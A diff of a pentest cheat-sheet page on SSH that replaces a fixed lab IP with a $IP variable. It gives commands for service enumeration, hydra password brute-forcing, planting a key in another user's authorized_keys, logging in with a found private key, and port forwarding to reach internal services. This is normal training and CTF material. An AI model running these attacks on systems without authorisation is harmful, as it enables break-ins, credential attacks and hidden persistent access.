@@ -1,15 +1,15 @@
 # SSH (22)
 
 !!! tip "Start here"
-    Check what auth methods are enabled: `ssh -v user@10.10.10.10`. Look for `publickey,password`. If password auth is on and you have a username, brute force is viable. Run `ssh-audit 10.10.10.10` to check for weak algorithms and known vulnerabilities.
+    Check what auth methods are enabled: `ssh -v user@$IP`. Look for `publickey,password`. If password auth is on and you have a username, brute force is viable. Run `ssh-audit $IP` to check for weak algorithms and known vulnerabilities.
 
 ---
 
 ## Enumeration
 
 ```bash
-nmap -p 22 -sV --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos 10.10.10.10
-ssh-audit 10.10.10.10
+nmap -p 22 -sV --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos $IP
+ssh-audit $IP
 ```
 
 ---
@@ -17,7 +17,7 @@ ssh-audit 10.10.10.10
 ## Brute Force
 
 ```bash
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP
 ```
 
 ---
@@ -29,7 +29,7 @@ If you have write access to a user's `.ssh` directory (via another vulnerability
 ```bash
 ssh-keygen -t ed25519 -f /tmp/injected_key
 cat /tmp/injected_key.pub >> /home/user/.ssh/authorized_keys
-ssh -i /tmp/injected_key user@10.10.10.10
+ssh -i /tmp/injected_key user@$IP
 ```
 
 ---
@@ -52,7 +52,7 @@ Once found:
 
 ```bash
 chmod 600 id_rsa
-ssh -i id_rsa user@10.10.10.10
+ssh -i id_rsa user@$IP
 ```
 
 ---
@@ -62,8 +62,8 @@ ssh -i id_rsa user@10.10.10.10
 Forward an internal service to your attacker machine:
 
 ```bash
-ssh -L 8080:127.0.0.1:8080 user@10.10.10.10
-ssh -L 3306:127.0.0.1:3306 user@10.10.10.10
+ssh -L 8080:127.0.0.1:8080 user@$IP
+ssh -L 3306:127.0.0.1:3306 user@$IP
 ```
 
 !!! tip "Real-world"
